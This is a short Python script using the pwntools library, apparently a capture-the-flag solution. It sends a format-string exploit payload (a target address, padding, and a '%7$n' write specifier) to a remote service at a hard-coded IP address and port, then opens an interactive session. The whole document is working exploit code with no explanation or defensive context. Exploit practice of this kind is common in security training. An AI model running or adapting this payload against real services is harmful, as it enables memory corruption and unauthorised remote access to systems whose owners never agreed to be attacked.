from pwn import *

payload = "\x2b\xc0\x04\x08"+"A"*255 + "%7$n"


p = remote('52.163.126.205', 33335)
print(p.recvuntil(':'))
p.sendline(payload)


p.interactive()
